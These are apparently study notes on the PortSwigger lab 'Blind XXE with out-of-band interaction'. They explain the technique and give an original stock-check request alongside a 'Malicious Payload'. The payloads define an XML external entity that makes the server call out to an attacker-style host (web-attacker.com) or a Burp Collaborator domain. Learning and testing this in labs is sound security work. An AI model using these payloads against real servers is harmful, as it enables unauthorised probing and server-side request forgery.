# Blind XXE with out-of-band interaction

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

## Definition
You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful. 

## Notes
This lab has a `Check stock` feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

**Remote Host**  
- [Portsweeger lab with an exploit server](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
- [Remote URL](https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit)
- [Fake burpcollaborator URL](https://abc1234def.burpcollaborator.net)

**Original Request**
```http
POST /product/stock HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0)
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
...

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

**Malicious Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY pwn SYSTEM "https://abc1234def.burpcollaborator.net">]>
<stockCheck><productId>&pwn;</productId><storeId>1</storeId></stockCheck>
```

## Key Words
> xml, xxe, remote host, blind, exploit server